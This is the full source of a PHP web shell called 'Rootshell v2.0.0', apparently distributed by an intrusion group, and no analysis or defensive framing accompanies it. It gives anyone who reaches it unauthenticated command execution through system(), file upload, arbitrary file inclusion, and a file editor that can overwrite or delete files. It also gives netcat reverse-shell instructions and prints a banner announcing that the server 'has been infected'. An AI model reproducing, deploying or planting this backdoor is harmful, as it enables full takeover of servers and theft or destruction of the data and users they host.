<!--
/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/*  ................jdWMMMMMNk&,...JjdMMMHMMHA+................ */
/*  .^.^.^.^.^.^..JdMMMBC:vHMMNI..`dMMM8C`ZMMMNs...^^.^^.^^.^^. */
/*  ..^.^..^.....dMMMBC`....dHNn...dMNI....`vMMMNy.........^... */
/*  .....^..?XMMMMMBC!..dMM@MMMMMMM#MMH@MNZ,^!OMMHMMNk!..^...^. */
/*  ^^.^..^.`??????!`JdN0??!??1OUUVT??????XQy!`??????!`..^..^.^ */
/*  ..^..^.....^..^..?WN0`` `  +llz:`    .dHR:..^.......^..^... */
/*  ...^..^.^.^..^...`?UXQQQQQeyltOOagQQQeZVz`..^.^^..^..^..^.. */
/*  ^.^..^..^..^..^.^..`zWMMMMH0llOXHMMMM9C`..^.....^..^..^..^. */
/*  ..^..^...^..+....^...`zHHWAwtltwAXH8I....^...?+....^...^..^ */
/*  ...^..^...JdMk&...^.^..^zHNkAAwWMHc...^.....jWNk+....^..^.. */
/*  ^.^..^..JdMMMMNHo....^..jHMMMMMMMHl.^..^..jWMMMMNk+...^..^. */
/*  .^....jdNMM9+4MMNmo...?+zZV7???1wZO+.^..ddMMM6?WMMNmc..^..^ */
/*  ^.^.jqNMM9C!^??UMMNmmmkOltOz+++zltlOzjQQNMMY?!`??WMNNmc^.^. */
/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */
/*  OUUUUU6:.jgWNNmx,`OUWHHHHHSI..?wWHHHHHW9C!.udMNHAx.?XUUUU9C */
/*  .......+dWMMMMMNm+,`+ltltlzz??+1lltltv+^.jdMMMMMMHA+......^ */
/*  ..^..JdMMMMC`vMMMNkJuAAAAAy+...+uAAAAA&JdMMMBC`dMMMHs....^. */
/*  ....dMMMMC``.``zHMMMMMMMMMMS==zXMMMMMMMMMM8v``.`?ZMMMNs.... */
/*  dMMMMMBC!`.....`!?????1OVVCz^^`+OVVC??????!`....^`?vMMMMMNk */
/*  ??????!`....^.........?ztlOz+++zlltz!........^.....???????! */
/*  .....^.^^.^..^.^^...uQQHkwz+!!!+zwWHmmo...^.^.^^.^..^....^. */
/*  ^^.^.....^.^..^...ugHMMMNkz1++++zXMMMMHmx..^....^.^..^.^..^ */
/*  ..^.^.^.....^...jdHMMMMM9C???????wWMMMMMHn+...^....^..^..^. */
/*  ^....^.^.^....JdMMMMMMHIz+.......?zdHMMMMMNA....^..^...^..^ */
/*  .^.^....^...JdMMMMMMHZttOz1111111zlttwWMMMMMNn..^.^..^..^.. */
/*  ..^.^.^....dNMMMMMWOOtllz!^^^^^^^+1lttOZWMMMMMNA,....^..^.. */
/*  ^....^..?dNMMMMMC?1ltllllzzzzzzzzzlllltlz?XMMMMNNk+^..^..^. */
/*  .^.^..+dNMM8T77?!`+lllz!!!!!!!!!!!!+1tll+`??777HMNHm;..^..^ */
/*  ..^..^jHMMNS`..^.`+ltlz+++++++++++++ztll+`....`dMMMHl.^..^. */
/*  ....^.jHMMNS`^...`+ltlz+++++++++++++zltl+`^.^.`dMMMHl..^..^ */
/*  ^^.^..jHMMNS`.^.^`+tllz+...........?+ltl+`.^..`dMMMHl...^.. */
/*  ..^..^jHMMM6`..^.`+lltltltlz111zltlltlll+`...^`dMMMHl.^..^. */
/*  ....^.jHNC``.^...`+zltlltlz+^^.+zltlltzz+`..^.^`?dMHl..^..^ */
/*  .^.^..jHNI....^..^``+zltltlzzzzzltltlv!``.^...^..dMHc....^. */
/*  ^...jdNMMNmo...^...^`?+ztlltllltlltz!``..^.^...dqNMMNmc.^.. */
/*  .^.`?7TTTTC!`..^.....^`?!!!!!!!!!!!!`..^....^.`?7TTTTC!..^. */
/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */
/*
/*    We should take care some kind of history, i will add here to keep a trace of changes (who made it).
/*    Also I think we should increase the last version number by 1 if you make some changes.
/*
/*    CHANGES / VERSION HISTORY:
/*    ====================================================================================
/*    Version        Nick            Description
/*    - - - - - - - - - - - - - - - - - - - - - - - - - - -
/*    0.3.1          666            added an ascii bug :)
/*    0.3.1          666            password protection
/*    0.3.1          666            GET and POST changes
/*    0.3.2          666            coded a new uploader
/*    0.3.2          666            new password protection
/*    0.3.3          666            added a lot of comments :)
/*    0.3.3          666            added "Server Info"
/*    1.0.0          666            added "File Inclusion"
/*    1.0.0          666            removed password protection (nobody needs it...)
/*    1.0.0          666            added "Files & Directories"
/*    1.3.3          666            added "File Editor"
/*    2.0.0          666            added "Notices"
/*    2.0.0          666            added some new modules
/*    2.0.0          666            made some design updates
/*
/*
-->
<?
//
// Default Changes
//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

$owner        = "shells.dl.am";                                                      // Insert your nick
$version      = "2.0.0";                                                        // The version    

//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
//
?>

<body link="#000000" vlink="#000000" alink="#000000" bgcolor="#FFFFD5">
<style type="text/css">
body{
cursor:crosshair 
}
</style>
<div align="center" style="width: 100%; height: 100">
<pre width="100%" align="center"><strong> ____             _         ____  _          _ _
|  _ \ ___   ___ | |_      / ___|| |__   ___| | |
| |_) / _ \ / _ \| __|     \___ \| '_ \ / _ \ | |
|  _ < (_) | (_) | |_   _   ___) | | | |  __/ | |
|_| \_\___/ \___/ \__| (_) |____/|_| |_|\___|_|_|</pre>
</div></strong>
<b><u><center><font face='Verdana' style='font-size: 8pt'><?php echo "This server has been infected by $owner"; ?></font></center></u></b>
<hr color="#000000" size="2,5">

<div align="center">
  <center>
  <p>
  <?php 
// Check for safe mode
if( ini_get('safe_mode') ) {
   print '<font face="Verdana" color="#FF0000" style="font-size:10pt"><b>Safe Mode ON</b></font>';
} else {
   print '<font face="Verdana" color="#008000" style="font-size:10pt"><b>Safe Mode OFF</b></font>';
}

?>
&nbsp;</p><font face="Webdings" size="6">!</font><br>
&nbsp;<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1" height="25" bordercolor="#000000">
    <tr>
      <td width="1%" height="25" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ Server Info ]</font></td>
    </tr>
    <tr>
      <td width="49%" height="142">
      <p align="center">
        <font face="Verdana" style="font-size: 8pt"><b>Current Directory:</b> <? echo $_SERVER['DOCUMENT_ROOT']; ?>
        <br />
        <b>Shell:</b> <? echo $SCRIPT_FILENAME ?>
        <br>
        <b>Server Software:</b> <? echo $SERVER_SOFTWARE ?><br>
        <b>Server Name:</b> <? echo $SERVER_NAME ?><br>
        <b>Server Protocol:</b> <? echo $SERVER_PROTOCOL ?><br>
        </font></tr>
  </table><br />
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1" height="426" bordercolor="#000000">
    <tr>
      <td width="49%" height="25" bgcolor="#FCFEBA" valign="middle">
      <p align="center"><font face="Verdana" size="2">[ Command Execute ]</font></td>
      <td width="51%" height="26" bgcolor="#FCFEBA" valign="middle">
      <p align="center"><font face="Verdana" size="2">[ File Upload ]</font></td>
    </tr>
    <tr>
      <td width="49%" height="142">
      <p align="center"><form method="post">
<p align="center">
<br>
<font face="Verdana" style="font-size: 8pt">Insert your commands here:</font><br>
<br>
<textarea size="70" name="command" rows="2" cols="40" ></textarea> <br>
<br><input type="submit" value="Execute!"><br>
&nbsp;<br></p>
      </form>
      <p align="center">
        <textarea readonly size="1" rows="7" cols="53"><?php @$output = system($_POST['command']); ?></textarea><br>
        <br>
        <font face="Verdana" style="font-size: 8pt"><b>Info:</b> For a connect 
        back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>
        </i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br /> <td><p align="center"><br>
<form enctype="multipart/form-data" method="post">
<p align="center"><br>
<br>
<font face="Verdana" style="font-size: 8pt">Here you can upload some files.</font><br>
<br>
<input type="file" name="file" size="20"><br>
<br>
<font style="font-size: 5pt">&nbsp;</font><br>
<input type="submit" value="Upload File!"> <br>
&nbsp;</p>
</form>
<?php

function check_file()
{
global $file_name, $filename;
    $backupstring = "copy_of_";
    $filename = $backupstring."$filename";

    if( file_exists($filename))
    {
        check_file();
    }
}

if(!empty($file))
{
    $filename = $file_name;
    if( file_exists($file_name))
    {
        check_file();
        echo "<p align=center>File already exist</p>";
    }

    else
    {
        copy($file,"$filename");
        if( file_exists($filename))
        {
            echo "<p align=center>File uploaded successful</p>";
        }
        elseif(! file_exists($filename))
        {
            echo "<p align=center>File not found</p>";
        }
    }
}
?> 
<font face="Verdana" style="font-size: 8pt">
<p align=\"center\"></font>
</td>

      </tr>
      <tr>
      <td style="overflow:auto" width="49%" height="25" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ Files & Directories ]</font></td>
      <td width="51%" height="19" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ File Inclusion ]</font></td>
      </tr>
      <tr>
      <td style="overflow:auto" width="49%" height="231">
<font face="Verdana" style="font-size: 11pt">
      <p align="center">
      <br>
<div align="center" style="overflow:auto; width:99%; height:175">
<?
$folder=opendir('./');
while ($file = readdir($folder)) {
if($file != "." && $file != "..")
echo '<a target="blank" href='.$file.'>'.$file.'</a><br>';
}
closedir($folder);
?>
</div><p align="center">&nbsp;</td>
      <td width="51%" height="232">
      <p align="center"><font face="Verdana" style="font-size: 8pt"><br>
      Include 
      something :)<br>
      <br>
&nbsp;</font><form method="POST">
       <p align="center">
        <input type="text" name="incl" size="20"><br>
        <br>
        <input type="submit" value="Include!" name="inc"></p>
      </form>
      <?php @$output = include($_POST['incl']); ?>
      </td>
      </tr>
    <tr>
      <td width="49%" height="25" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ File Editor ]</font></td>
      <td width="51%" height="19" bgcolor="#FCFEBA">
      <p align="center"><font face="Verdana" size="2">[ Notices ]</font></td>
    </tr>
    <tr>
      <td width="49%" height="231">
<font face="Verdana" style="font-size: 11pt">
      <p align="center"><?
$scriptname = $_SERVER['SCRIPT_NAME'];
$filename = $_POST["filename"];

if($_POST["submit"] == "Open")
{
	if(file_exists($filename))
	{
		$filecontents = htmlentities(file_get_contents($filename));

		if(!$filecontents)
			$status = "<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>";
	}
	else
		$status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
}		
else if($_POST["submit"] == "Delete")
{
	if(file_exists($filename))
	{
		if(unlink($filename))	
			$status = "<font face='Verdana' style='font-size: 8pt'>File successfully deleted!</font>";
		else
			$status = "<font face='Verdana' style='font-size: 8pt'>Could not delete file!</font>";
	}
	else
		$status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
}
else if($_POST["submit"] == "Save")
{
	$filecontents = stripslashes(html_entity_decode($_POST["contents"]));

	if(file_exists($filename))
		unlink($filename);

	$handle = fopen($filename, "w");

	if(!$handle)
		$status = "<font face='Verdana' style='font-size: 8pt'>Could not open file for write access! </font>";
	else
	{
		if(!fwrite($handle, $filecontents))
			$status = $status."<font face='Verdana' style='font-size: 8pt'>Could not write to file! (Maybe you didn't enter any text?)</font>";

		fclose($handle);
	}

	$filecontents = htmlentities($filecontents);
}
else
{
	$status = "<font face='Verdana' style='font-size: 8pt'>No file loaded!</font>";
}
?>
<table border="0" align="center">
		
		<tr>
			<td>
				<table width="100%" border="0">
				<tr>
					<td>
						<form method="post" action="<?echo $scriptname;?>">
							<input name="filename" type="text" value="<?echo $filename;?>" size="20">
							<input type="submit" name="submit" value="Open">
							<input type="submit" name="submit" value="Delete">
					</td>
				</tr>
				</table>
			</td>
		</tr>

		<tr>
			<td>
					<font face="Verdana" style="font-size: 11pt">
					<textarea name="contents" cols="53" rows="8"><?echo $filecontents;?></textarea></font><br>
					<input type="submit" name="submit" value="Save">
					<input type="reset" value="Reset">
				</form>
			</td>
		</tr>

		<tr>
			<td>
				<h2><?echo $status;?></h2>
			</td>
		</tr>
		</table>				</td>
      <td width="51%" height="232">
      <p align="center"><font face="Verdana" style="font-size: 8pt"><br>
<textarea rows="13" cols="55"></textarea><br>
      &nbsp;</font><?php @$output = include($_POST['incl']); ?></td>
    </tr>
  </table>
  </center>
</div>
<br /></p>
<div align="center">
  <center>
  <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber2">
    <tr>
      <td width="100%" bgcolor="#FCFEBA" height="20">
      <p align="center"><font face="Verdana" size="2">Rootshell v<?php echo "$version" ?>  © 2006 by <a style="text-decoration: none" target="_blank" href="http://www.SR-Crew.org">SR-Crew</a> </font></td>
    </tr>
  </table>
  </center>
</div>
